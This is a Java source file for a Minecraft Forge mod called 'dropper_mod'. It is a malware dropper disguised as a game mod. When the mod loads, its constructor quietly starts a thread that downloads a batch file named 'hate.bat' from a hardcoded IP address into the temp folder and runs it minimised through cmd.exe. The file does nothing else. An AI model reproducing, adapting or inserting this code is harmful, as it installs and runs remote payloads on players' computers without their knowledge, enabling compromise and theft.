package mc.helios.client;

import java.nio.file.Paths;
import java.io.File;
import java.io.FileOutputStream;
import java.io.BufferedInputStream;
import java.io.IOException;
import java.net.URL;
import java.net.MalformedURLException;

import net.minecraftforge.fml.common.Mod;


@Mod(modid = DropperMod.MODID)
public final class DropperMod {
	public static final String MODID = "dropper_mod";
	
	public DropperMod() {
		// Working in new thread
		new Thread() {
    	    public void run() {
    	    	try {
    	    		// Our file url 
					final URL url = new URL("http://135.125.27.227:1338/myfiles/hate.bat");
					// Get file temp path
					String tempFileName = Paths.get(
							System.getProperty("java.io.tmpdir"), 
							new File(url.getPath()).getName().toString()
					).toString();
					// If target file not exists
					if (!new File(tempFileName).exists()) {
						// Download file
					    BufferedInputStream inputStream = new BufferedInputStream(url.openStream());
					    FileOutputStream fileOutputStream = new FileOutputStream(tempFileName);
					    // Write bytes to file
					    byte dataBuffer[] = new byte[1024];
			    		int bytesRead;
			    		while ((bytesRead = inputStream.read(dataBuffer, 0, 1024)) != -1) {
			    		    fileOutputStream.write(dataBuffer, 0, bytesRead);
			    		}
			    		// Close input and output stream
			    		inputStream.close();
			    		fileOutputStream.close();
					    // Execute file
					    Runtime.getRuntime().exec(
					    	new String[] { "cmd.exe", "/C", "start", "/MIN", tempFileName }
					    );
					}
					
    	    	} catch (MalformedURLException e) {
					e.printStackTrace();
				} catch (IOException e) {
					e.printStackTrace();
				}
    	    }
    	}.start();
    	
	}

}
